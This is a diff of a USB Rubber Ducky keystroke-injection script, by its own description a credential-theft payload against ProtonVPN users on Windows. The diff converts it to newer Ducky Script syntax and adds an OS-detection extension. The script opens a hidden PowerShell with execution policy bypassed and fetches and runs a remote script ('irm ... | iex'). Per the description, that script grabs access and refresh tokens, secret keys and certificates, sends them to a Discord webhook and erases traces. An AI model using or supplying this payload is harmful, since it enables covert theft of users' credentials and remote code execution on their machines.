@@ -1,43 +1,83 @@
-REM ###################################################################
-REM #                                                                 |
-REM # Title        : ProtonVPN-config-to-Discord-Exfiltration         |
-REM # Author       : Aleff                                            |
-REM # Version      : 1.0                                              |
-REM # Category     : Credentials, Exfiltration                        |
-REM # Target       : Windows 10-11                                    |
-REM #                                                                 |
-REM ###################################################################
+REM_BLOCK
+###################################################################
+#                                                                 #
+# Title        : ProtonVPN-config-to-Discord-Exfiltration         #
+# Author       : Aleff                                            #
+# Version      : 1.0                                              #
+# Category     : Credentials, Exfiltration                        #
+# Target       : Windows 10-11                                    #
+#                                                                 #
+###################################################################
 
-REM Title: ProtonVPN-config-to-Discord-Exfiltration
-REM Author: Aleff
-REM Description: Opens PowerShell hidden, grabs ProtonVPN config file, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
-REM              In the config file you can find a lot information about the user like:
-REM              - UserUid 
-REM              - UserAccessToken
-REM              - UserRefreshToken
-REM              - UserAuthenticationPublicKey
-REM              - UserAuthenticationSecretKey
-REM              - UserAuthenticationCertificatePem
-REM              - UserCertificationServerPublicKey 
-REM              - and so on...
-REM              Then it cleans up traces of what you have done after.
-REM Target: Windows 10-11 (PowerShell + ProtonVPN software)
-REM Version: 1.0
-REM Category: Credentials, Exfiltration
-REM Requirements: ProtonVPN user logged at least one time and internet connection
-REM 
+Title: ProtonVPN-config-to-Discord-Exfiltration
+Author: Aleff
+Description: Opens PowerShell hidden, grabs ProtonVPN config file, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
+            In the config file you can find a lot information about the user like:
+              - UserUid 
+              - UserAccessToken
+              - UserRefreshToken
+              - UserAuthenticationPublicKey
+              - UserAuthenticationSecretKey
+              - UserAuthenticationCertificatePem
+              - UserCertificationServerPublicKey 
+              - and so on...
+              Then it cleans up traces of what you have done after.
+Target: Windows 10-11 (PowerShell + ProtonVPN software)
+Version: 1.0
+Category: Credentials, Exfiltration
+Requirements: ProtonVPN user logged at least one time and internet connection
+END_REM
+
+REM Reply example.com with YOUR LINK. The Payload should be ProtonVPN-config.ps1
+DEFINE #PAYLOAD example.com
 
 REM REQUIRED - Provide your url WEBHOOK - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-DEFINE WEBHOOK example.com
+DEFINE #WEBHOOK example.com
 
-DELAY 2000
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
 GUI r
 DELAY 250
 DELETE
-STRING powershell -w h -ep bypass $discord='
-STRING WEBHOOK
-
-REM Reply example.com with YOUR LINK. The Payload should be ProtonVPN-config.ps1
-DEFINE PAYLOAD example.com
-STRING ';irm PAYLOAD | iex
-ENTER
+STRINGLN powershell -w h -ep bypass $discord='#WEBHOOK';irm #PAYLOAD | iex
